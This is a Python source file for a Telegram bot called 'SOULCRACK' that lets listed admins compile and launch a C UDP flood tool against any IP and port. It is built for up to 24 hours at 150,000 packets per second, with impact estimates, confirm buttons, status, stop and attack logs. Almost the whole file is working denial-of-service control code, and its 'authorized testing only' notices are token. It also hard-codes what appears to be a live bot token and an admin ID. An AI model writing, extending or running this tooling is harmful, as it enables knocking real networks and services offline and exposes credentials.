#!/usr/bin/env python3
import asyncio
import subprocess
import os
import re
import psutil
import threading
import time
import json
from datetime import datetime
import socket
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
import logging

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot configuration
BOT_TOKEN = "7768886220:AAEx-BPaIcj8UG5QZA-Jn87bg-PIKc_nt2I"
ADMIN_USER_IDS = [5939471267]  # Your Telegram User IDs

class SoulCrackAttackManager:
    def __init__(self):
        self.process = None
        self.is_running = False
        self.start_time = None
        self.attack_log = []
        self.max_log_entries = 100
        
    def log_attack(self, action, target=None, duration=None, user=None):
        """Log attack activities"""
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'action': action,
            'target': target,
            'duration': duration,
            'user': user,
            'pid': self.process.pid if self.process else None
        }
        self.attack_log.append(log_entry)
        
        if len(self.attack_log) > self.max_log_entries:
            self.attack_log.pop(0)
    
    async def compile_c_program(self):
        """Compile the advanced C UDP flooder"""
        try:
            if os.path.exists("./soulcrack"):
                return True, "Binary already exists"
                
            compile_cmd = [
                "gcc", "-o", "soulcrack", "soulcrack.c", 
                "-lpthread", "-O3", "-march=native", "-mtune=native",
                "-flto", "-D_GNU_SOURCE"
            ]
            result = subprocess.run(compile_cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0:
                return True, "Compilation successful with optimizations"
            else:
                return False, f"Compilation failed: {result.stderr}"
                
        except Exception as e:
            return False, f"Compilation error: {str(e)}"
    
    def validate_target(self, ip, port):
        """Validate target IP and port"""
        ip_pattern = re.compile(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')
        if not ip_pattern.match(ip):
            return False, "Invalid IP address format"
        
        segments = ip.split('.')
        for segment in segments:
            if not (0 <= int(segment) <= 255):
                return False, "Invalid IP address range"
        
        if not (1 <= port <= 65535):
            return False, "Port must be 1-65535"
        
        return True, "Valid target"
    
    async def start_attack(self, ip, port, duration, user):
        """Start the advanced UDP flood attack"""
        if self.is_running:
            return False, "Attack already running! Stop current attack first."
        
        is_valid, message = self.validate_target(ip, port)
        if not is_valid:
            return False, message
        
        if not (1 <= duration <= 86400):
            return False, "Duration must be 1-86400 seconds"
        
        try:
            # Check if binary exists and compile if needed
            if not os.path.exists("./soulcrack"):
                success, compile_msg = await self.compile_c_program()
                if not success:
                    return False, f"Compilation failed: {compile_msg}"
            
            # Start attack with fixed 150000 PPS as required by the C code
            command = ["./soulcrack", ip, str(port), str(duration), "150000"]
            
            self.process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            self.is_running = True
            self.start_time = datetime.now()
            
            self.log_attack("START", f"{ip}:{port}", duration, user)
            
            # Start monitoring thread
            monitor_thread = threading.Thread(target=self.monitor_attack)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            return True, f"🚀 SOULCRACK Attack Launched!\nTarget: {ip}:{port}\nDuration: {duration}s\nPPS: 150,000"
            
        except Exception as e:
            return False, f"Failed to start attack: {str(e)}"
    
    def monitor_attack(self):
        """Monitor the attack process in background"""
        try:
            stdout, stderr = self.process.communicate()
            self.is_running = False
            
            duration = (datetime.now() - self.start_time).total_seconds() if self.start_time else 0
            self.log_attack("COMPLETE", duration=duration)
            
        except Exception as e:
            logger.error(f"Monitor error: {e}")
            self.is_running = False
    
    def stop_attack(self):
        """Stop current attack"""
        if not self.is_running or not self.process:
            return False, "No active attack to stop"
        
        try:
            parent = psutil.Process(self.process.pid)
            children = parent.children(recursive=True)
            
            for child in children:
                child.terminate()
            parent.terminate()
            
            gone, still_alive = psutil.wait_procs([parent] + children, timeout=5)
            for p in still_alive:
                p.kill()
            
            self.is_running = False
            self.process = None
            
            self.log_attack("STOP")
            
            return True, "🛑 Attack stopped successfully"
            
        except Exception as e:
            return False, f"Error stopping attack: {str(e)}"
    
    def get_attack_info(self):
        """Get current attack information"""
        if not self.is_running:
            return None
        
        info = {
            'running': self.is_running,
            'start_time': self.start_time.isoformat() if self.start_time else None,
            'duration': (datetime.now() - self.start_time).total_seconds() if self.start_time else 0,
            'pid': self.process.pid if self.process else None
        }
        
        return info
    
    def calculate_impact(self, ip, port, duration):
        """Calculate estimated attack impact based on C code parameters"""
        # From C code: 150000 PPS, 1472 bytes/packet, 512 threads
        packets_per_second = 150000
        packet_size = 1472
        threads = 512
        
        total_packets = packets_per_second * duration
        total_data_gb = (total_packets * packet_size) / (1024**3)
        bandwidth_mbps = (packets_per_second * packet_size * 8) / 1000000
        
        return {
            'target': f"{ip}:{port}",
            'duration': duration,
            'total_packets': f"{total_packets:,}",
            'total_data_gb': f"{total_data_gb:.2f}",
            'bandwidth_mbps': f"{bandwidth_mbps:.2f}",
            'packets_per_second': f"{packets_per_second:,}",
            'threads': threads,
            'packet_size': packet_size,
            'burst_size': 64,
            'traffic_patterns': 16
        }

# Initialize attack manager
attack_manager = SoulCrackAttackManager()

def is_admin(update: Update):
    """Check if user is admin"""
    return update.effective_user.id in ADMIN_USER_IDS

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send welcome message"""
    if not is_admin(update):
        await update.message.reply_text("❌ Unauthorized access. This bot is for admin use only.")
        return
    
    welcome_text = """
⚡ *SOULCRACK ULTRA UDP FLOOD BOT* ⚡

*🎯 Advanced Features:*
• 512 Threads with CPU affinity
• 16 Traffic Patterns (Video, Gaming, AI, Blockchain, etc.)
• 150,000 Packets/Second
• 1472 Byte packets
• 64-packet bursts
• Real-time rate control
• Huge page memory allocation

*🚀 Attack Commands:*
/calc <IP> <PORT> <TIME> - Calculate impact
/attack <IP> <PORT> <TIME> - Start attack
/stop - Stop current attack

*📊 Monitoring Commands:*
/status - Attack status
/stats - System statistics  
/logs - Attack history
/info - Technical details

*⚡ Quick Examples:*
/calc 192.168.1.1 80 60
/attack 192.168.1.1 80 30

⚠️ *Authorized testing only!*
    """
    
    await update.message.reply_text(welcome_text, parse_mode='Markdown')

async def calc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Calculate attack impact"""
    if not is_admin(update):
        await update.message.reply_text("❌ Unauthorized access.")
        return
    
    if len(context.args) != 3:
        await update.message.reply_text("❌ Usage: /calc <IP> <PORT> <TIME>")
        return
    
    ip, port, duration = context.args
    duration = int(duration)
    
    is_valid, message = attack_manager.validate_target(ip, port)
    if not is_valid:
        await update.message.reply_text(f"❌ {message}")
        return
    
    impact = attack_manager.calculate_impact(ip, int(port), duration)
    
    result_text = f"""
📊 *SOULCRACK Impact Calculation*

🎯 *Target:* `{impact['target']}`
⏰ *Duration:* {impact['duration']} seconds

⚡ *Attack Profile:*
• Threads: {impact['threads']}
• Packets/Second: {impact['packets_per_second']}
• Packet Size: {impact['packet_size']} bytes
• Burst Size: {impact['burst_size']} packets
• Traffic Patterns: {impact['traffic_patterns']}

📈 *Estimated Impact:*
• Total Packets: {impact['total_packets']}
• Total Data: {impact['total_data_gb']} GB
• Bandwidth: {impact['bandwidth_mbps']} Mbps

🎭 *Traffic Patterns:*
Video Stream, Gaming Protocol, AI Inference, Blockchain TX, Crypto Hashes, and 12 more!
    """
    
    keyboard = [[InlineKeyboardButton("⚡ Launch Attack", callback_data=f"attack_{ip}_{port}_{duration}")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(result_text, reply_markup=reply_markup, parse_mode='Markdown')

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start UDP flood attack"""
    if not is_admin(update):
        await update.message.reply_text("❌ Unauthorized access.")
        return
    
    if len(context.args) != 3:
        await update.message.reply_text("❌ Usage: /attack <IP> <PORT> <TIME>")
        return
    
    ip, port, duration = context.args
    
    # Show confirmation with impact calculation
    impact = attack_manager.calculate_impact(ip, int(port), int(duration))
    
    confirm_text = f"""
🚀 *CONFIRM SOULCRACK ATTACK*

🎯 *Target:* `{ip}:{port}`
⏰ *Duration:* {duration} seconds
⚡ *Power:* 150,000 PPS

📊 *Expected Impact:*
• {impact['total_packets']} total packets
• {impact['total_data_gb']} GB data
• {impact['bandwidth_mbps']} Mbps bandwidth

⚠️ *This will generate massive traffic with 16 different patterns!*

*Are you sure you want to proceed?*
    """
    
    keyboard = [
        [InlineKeyboardButton("✅ CONFIRM ATTACK", callback_data=f"confirm_{ip}_{port}_{duration}")],
        [InlineKeyboardButton("❌ CANCEL", callback_data="cancel")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(confirm_text, reply_markup=reply_markup, parse_mode='Markdown')

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle inline button presses"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data.startswith('attack_'):
        # Direct attack from calc button
        _, ip, port, duration = data.split('_')
        await query.edit_message_text(f"🚀 Starting SOULCRACK attack on `{ip}:{port}` for {duration}s...")
        
        success, message = await attack_manager.start_attack(ip, int(port), int(duration), query.from_user.name)
        
        if success:
            await query.edit_message_text(f"✅ {message}")
        else:
            await query.edit_message_text(f"❌ {message}")
    
    elif data.startswith('confirm_'):
        # Confirmed attack
        _, ip, port, duration = data.split('_')
        await query.edit_message_text(f"🚀 Starting SOULCRACK attack on `{ip}:{port}` for {duration}s...")
        
        success, message = await attack_manager.start_attack(ip, int(port), int(duration), query.from_user.name)
        
        if success:
            result_text = f"""
✅ *SOULCRACK ATTACK LAUNCHED!*

{message}

📊 *Real-time statistics will be shown in the terminal*
🎭 *16 Traffic patterns active*
⚡ *512 Threads deployed*

*Use /status to check progress*
*Use /stop to terminate early*
            """
            await query.edit_message_text(result_text, parse_mode='Markdown')
        else:
            await query.edit_message_text(f"❌ {message}")
    
    elif data == 'cancel':
        await query.edit_message_text("❌ Attack cancelled.")

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop current attack"""
    if not is_admin(update):
        await update.message.reply_text("❌ Unauthorized access.")
        return
    
    success, message = attack_manager.stop_attack()
    await update.message.reply_text(message)

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check attack status"""
    if not is_admin(update):
        await update.message.reply_text("❌ Unauthorized access.")
        return
    
    attack_info = attack_manager.get_attack_info()
    
    if attack_info and attack_info['running']:
        duration = attack_info['duration']
        status_text = f"""
🟢 *SOULCRACK ATTACK RUNNING*

⏱️ *Duration:* {duration:.1f}s
🔢 *PID:* {attack_info['pid']}

⚡ *Real-time Features:*
• 512 Threads with CPU affinity
• 16 Traffic patterns
• 150,000 PPS target
• 1472 byte packets
• Adaptive rate control

*Check terminal for live statistics!*
        """
    else:
        status_text = """
🔴 *NO ACTIVE ATTACK*

💡 *Ready for SOULCRACK deployment!*

*Use:* /attack <IP> <PORT> <TIME>
*Example:* /attack 192.168.1.1 80 30
        """
    
    await update.message.reply_text(status_text, parse_mode='Markdown')

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show system statistics"""
    if not is_admin(update):
        await update.message.reply_text("❌ Unauthorized access.")
        return
    
    try:
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        net_io = psutil.net_io_counters()
        disk = psutil.disk_usage('/')
        
        stats_text = f"""
💻 *System Statistics*

🖥️ *CPU:*
Usage: {cpu_percent}%
Cores: {psutil.cpu_count()}

💾 *Memory:*
Total: {memory.total // (1024**3)} GB
Used: {memory.percent}%
Available: {memory.available // (1024**3)} GB

📡 *Network:*
Sent: {net_io.bytes_sent // (1024**2)} MB
Received: {net_io.bytes_recv // (1024**2)} MB

💿 *Disk:*
Used: {disk.percent}%
Free: {disk.free // (1024**3)} GB
        """
        
        attack_info = attack_manager.get_attack_info()
        if attack_info and attack_info['running']:
            stats_text += f"\n🚀 *Attack Status:* Running for {attack_info['duration']:.1f}s"
        
        await update.message.reply_text(stats_text, parse_mode='Markdown')
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error getting statistics: {str(e)}")

async def logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show attack history"""
    if not is_admin(update):
        await update.message.reply_text("❌ Unauthorized access.")
        return
    
    if not attack_manager.attack_log:
        await update.message.reply_text("📝 No attack history found")
        return
    
    recent_logs = attack_manager.attack_log[-5:]
    
    logs_text = "📋 *Recent SOULCRACK History*\n\n"
    
    for log in reversed(recent_logs):
        timestamp = datetime.fromisoformat(log['timestamp']).strftime("%m/%d %H:%M")
        
        if log['action'] == 'START':
            logs_text += f"🟢 {timestamp} - START\n   Target: {log['target']}\n   Duration: {log['duration']}s\n\n"
        elif log['action'] == 'STOP':
            logs_text += f"🟡 {timestamp} - STOPPED\n\n"
        elif log['action'] == 'COMPLETE':
            logs_text += f"🔵 {timestamp} - COMPLETED\n   Duration: {log['duration']:.1f}s\n\n"
    
    await update.message.reply_text(logs_text, parse_mode='Markdown')

async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show technical information about SOULCRACK"""
    if not is_admin(update):
        await update.message.reply_text("❌ Unauthorized access.")
        return
    
    info_text = """
🤖 *SOULCRACK ULTRA UDP FLOODER*

⚡ *Technical Specifications:*
• 512 Concurrent threads
• 150,000 Packets/second
• 1472 Byte packet size
• 64-packet burst mode
• 16 Traffic patterns
• CPU core affinity
• Huge page memory allocation

🎭 *Traffic Patterns:*
1. Constant Burst
2. Incremental Flow  
3. Random Entropy
4. Sine Wave
5. Sawtooth
6. Exponential
7. Chaotic
8. Fractal
9. Crypto Hash
10. Compressed Data
11. Encrypted Payload
12. Video Stream
13. Gaming Protocol
14. IoT Sensor
15. AI Inference
16. Blockchain TX

🛠️ *Advanced Features:*
• Real-time rate control (PID controller)
• Xorshift128+ PRNG for entropy
• RDTSC for nanosecond timing
• Cache-line aligned structures
• MSG_DONTWAIT for non-blocking sends
• Adaptive burst pacing

⚠️ *Legal Notice:*
For authorized testing only.
Unauthorized use is illegal.
    """
    
    await update.message.reply_text(info_text, parse_mode='Markdown')

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors"""
    logger.error(f"Exception while handling an update: {context.error}")
    
    try:
        if update and update.effective_message:
            await update.effective_message.reply_text(
                "❌ An error occurred while processing your command. Please try again."
            )
    except:
        pass

def main():
    """Start the Telegram bot"""
    print("🚀 Starting SOULCRACK UDP Flood Telegram Bot...")
    print("⚡ Advanced features: 512 threads, 16 patterns, 150K PPS")
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add error handler
    application.add_error_handler(error_handler)
    
    # Add command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("calc", calc))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("stats", stats))
    application.add_handler(CommandHandler("logs", logs))
    application.add_handler(CommandHandler("info", info))
    application.add_handler(CommandHandler("help", start))
    
    # Add button handler
    application.add_handler(CallbackQueryHandler(button_handler))
    
    print("🤖 SOULCRACK Bot is running...")
    application.run_polling()

if __name__ == "__main__":
    main()
